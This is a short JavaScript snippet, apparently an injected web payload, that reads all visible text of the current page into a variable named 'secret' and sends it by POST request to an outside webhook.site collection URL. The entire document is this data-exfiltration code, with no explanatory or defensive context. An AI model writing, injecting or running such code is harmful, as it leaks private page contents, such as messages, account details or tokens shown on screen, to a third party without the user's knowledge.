const secret = document.body.innerText; 

fetch("https://webhook.site/24b8629b-f9e4-4e91-a42a-80e7822f458d", {
  method: "POST",
  body: secret
});
